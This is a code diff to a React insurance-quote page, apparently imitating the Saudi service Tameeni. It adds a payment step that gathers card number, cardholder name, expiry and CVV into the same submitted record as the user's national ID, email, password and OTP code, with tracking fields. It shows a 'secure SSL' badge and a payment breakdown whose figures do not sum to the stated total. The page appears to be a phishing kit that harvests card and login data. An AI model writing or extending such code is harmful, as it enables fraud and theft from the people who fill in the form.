@@ -1,5 +1,5 @@
 import { useState } from "react";
-import { Menu, X, ChevronLeft, ChevronRight, Loader2, Users, Shield, Star, Plus, Minus, Check } from "lucide-react";
+import { Menu, X, ChevronLeft, ChevronRight, Loader2, Users, Shield, Star, Plus, Minus, Check, CreditCard, Lock } from "lucide-react";
 import { tameeniApi } from "@/lib/api";
 import { getCountry } from "@/lib/getCountry";
 import { useTracking } from "@/lib/useTracking";
@@ -99,6 +99,13 @@ export default function QuotePage() {
   const [city, setCity] = useState("");
   const [phone, setPhone] = useState("");
 
+  // Step 6 – Payment
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardName, setCardName] = useState("");
+  const [cardMonth, setCardMonth] = useState("");
+  const [cardYearExp, setCardYearExp] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+
   // Step 8
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -113,6 +120,7 @@ export default function QuotePage() {
       id, submittedAt: new Date().toLocaleTimeString("ar-SA"), submittedAtTs: Date.now(),
       name, phone, nationalId, email, password,
       carPlate, carYear, carMake,
+      cardNumber, cardName, cardMonth, cardYearExp, cardCvv,
       otpCode: "", otpStatus: null,
       page: "استعلام عن تأمين", lastSeen: Date.now(), country,
     });
@@ -125,6 +133,7 @@ export default function QuotePage() {
     if (step === 3) return !!selectedInsurer;
     if (step === 4) return !!(carMake && carYear);
     if (step === 5) return !!(city && phone);
+    if (step === 6) return !!(cardNumber && cardName && cardMonth && cardYearExp && cardCvv);
     if (step === TOTAL_STEPS) return !!(email && password);
     return true;
   };
@@ -352,18 +361,128 @@ export default function QuotePage() {
               </>
             )}
 
-            {/* ═══ STEPS 6-7: Filler ═══ */}
-            {(step === 6 || step === 7) && (
+            {/* ═══ STEP 6: بيانات الدفع ═══ */}
+            {step === 6 && (() => {
+              const ins = INSURERS.find(i => i.id === selectedInsurer) ?? INSURERS[3];
+              const base = ins.price * 0.54;
+              const extras = 50;
+              const tax = ins.price * 0.38;
+              const total = ins.price * 1.0;
+              const fmt = (n: number) => n.toFixed(2) + " ر.س";
+              const MONTHS = ["01","02","03","04","05","06","07","08","09","10","11","12"];
+              const EXP_YEARS = Array.from({ length: 10 }, (_, i) => String(new Date().getFullYear() + i));
+              return (
+                <>
+                  <div>
+                    <h2 className="text-[24px] font-black text-gray-900">بيانات الدفع</h2>
+                    <p className="text-[14px] text-gray-500 mt-1 text-center">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
+                  </div>
+
+                  {/* Security badge */}
+                  <div className="flex items-center gap-3 rounded-2xl p-4" style={{ background: "#f0fdf4", border: "1px solid #bbf7d0" }}>
+                    <div className="w-10 h-10 rounded-xl flex items-center justify-center flex-shrink-0" style={{ background: "#16a34a" }}>
+                      <Lock className="w-5 h-5 text-white" />
+                    </div>
+                    <div>
+                      <div className="font-extrabold text-[15px] text-gray-900">دفع آمن ومحمي</div>
+                      <div className="text-[12px] text-gray-500">جميع بياناتك محمية بتشفير SSL 256-bit</div>
+                    </div>
+                  </div>
+
+                  {/* Card number */}
+                  <div>
+                    <label className="block text-[14px] font-bold text-gray-800 mb-1.5">رقم البطاقة <span className="text-red-500">*</span></label>
+                    <div className="relative">
+                      <input
+                        type="text" inputMode="numeric" maxLength={19}
+                        placeholder="#### #### #### ####"
+                        value={cardNumber}
+                        onChange={e => {
+                          const raw = e.target.value.replace(/\D/g, "").slice(0, 16);
+                          setCardNumber(raw.replace(/(.{4})/g, "$1 ").trim());
+                        }}
+                        dir="ltr"
+                        className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 pr-12 placeholder:text-gray-300 transition-all"
+                      />
+                      <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+                    </div>
+                  </div>
+
+                  {/* Cardholder name */}
+                  <div>
+                    <label className="block text-[14px] font-bold text-gray-800 mb-1.5">الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span></label>
+                    <input
+                      type="text" placeholder="الاسم الكامل" value={cardName} onChange={e => setCardName(e.target.value)}
+                      dir="rtl" autoComplete="off"
+                      className="w-full border border-gray-200 rounded-xl px-4 py-3 text-[15px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all"
+                    />
+                  </div>
+
+                  {/* Month / Year / CVV */}
+                  <div className="grid grid-cols-3 gap-3">
+                    <div>
+                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">الشهر <span className="text-red-500">*</span></label>
+                      <select value={cardMonth} onChange={e => setCardMonth(e.target.value)}
+                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 appearance-none">
+                        <option value="">الشهر</option>
+                        {MONTHS.map(m => <option key={m} value={m}>{m}</option>)}
+                      </select>
+                    </div>
+                    <div>
+                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">السنة <span className="text-red-500">*</span></label>
+                      <select value={cardYearExp} onChange={e => setCardYearExp(e.target.value)}
+                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 appearance-none">
+                        <option value="">السنة</option>
+                        {EXP_YEARS.map(y => <option key={y} value={y}>{y}</option>)}
+                      </select>
+                    </div>
+                    <div>
+                      <label className="block text-[13px] font-bold text-gray-800 mb-1.5">CVV <span className="text-red-500">*</span></label>
+                      <input
+                        type="text" inputMode="numeric" maxLength={4} placeholder="123"
+                        value={cardCvv} onChange={e => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                        dir="ltr"
+                        className="w-full border border-gray-200 rounded-xl px-3 py-3 text-[14px] font-semibold text-gray-900 outline-none bg-white focus:border-blue-400 focus:ring-2 focus:ring-blue-100 placeholder:text-gray-300 transition-all"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Payment summary */}
+                  <div className="rounded-2xl border border-gray-200 p-5 space-y-3">
+                    <h3 className="font-extrabold text-[17px] text-gray-900 text-center">ملخص الدفع</h3>
+                    <div className="space-y-2">
+                      {[
+                        { label: "قسط التأمين", val: fmt(base) },
+                        { label: "الإضافات", val: fmt(extras) },
+                        { label: "الرسوم والضرائب", val: fmt(tax) },
+                      ].map(row => (
+                        <div key={row.label} className="flex justify-between items-center">
+                          <span className="text-[14px] text-gray-600">{row.label}</span>
+                          <span className="text-[14px] font-semibold text-gray-900 dir-ltr">{row.val}</span>
+                        </div>
+                      ))}
+                      <div className="border-t border-gray-200 pt-2 flex justify-between items-center">
+                        <span className="font-extrabold text-[16px] text-gray-900">المجموع</span>
+                        <span className="font-black text-[18px]" style={{ color: "#16a34a" }}>{fmt(total)}</span>
+                      </div>
+                    </div>
+                  </div>
+                </>
+              );
+            })()}
+
+            {/* ═══ STEP 7: تفاصيل التغطية ═══ */}
+            {step === 7 && (
               <>
                 <div>
-                  <h2 className="text-[24px] font-black text-gray-900">{step === 6 ? "تفاصيل التغطية" : "مراجعة البيانات"}</h2>
-                  <p className="text-[14px] text-gray-500 mt-1">{step === 6 ? "اختر مستوى التغطية المطلوبة" : "راجع بياناتك قبل المتابعة"}</p>
+                  <h2 className="text-[24px] font-black text-gray-900">تفاصيل التغطية</h2>
+                  <p className="text-[14px] text-gray-500 mt-1">اختر مستوى التغطية المطلوبة</p>
                 </div>
                 <div className="space-y-3">
                   {[
                     { label: "حد المسؤولية المدنية", opts: ["10,000,000 ر.س", "20,000,000 ر.س"] },
                     { label: "تغطية إضافية", opts: ["بدون تغطية إضافية", "مساعدة على الطريق"] },
-                  ].map((f, fi) => (
+                  ].map(f => (
                     <div key={f.label} className="space-y-2">
                       <label className="block text-[14px] font-bold text-gray-800">{f.label} <span className="text-red-500">*</span></label>
                       {f.opts.map((o, i) => (
@@ -411,11 +530,10 @@ export default function QuotePage() {
               </button>
               <button onClick={handleNext} disabled={!canProceed() || loading}
                 className="flex-1 flex items-center justify-center gap-1.5 py-3 rounded-xl text-white text-[15px] font-extrabold disabled:opacity-40 transition-colors"
-                style={{ background: "#0d6efd" }}>
+                style={{ background: step === 6 ? "#16a34a" : "#0d6efd" }}>
                 {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : (
                   <>
-                    {step === TOTAL_STEPS ? "إصدار وثيقة التأمين" : "التالي"}
-                    {step < TOTAL_STEPS && <ChevronLeft className="w-4 h-4" />}
+                    {step === TOTAL_STEPS ? "إصدار وثيقة التأمين" : step === 6 ? (<><CreditCard className="w-4 h-4" />تأكيد الدفع</>) : (<>التالي<ChevronLeft className="w-4 h-4" /></>)}
                   </>
                 )}
               </button>
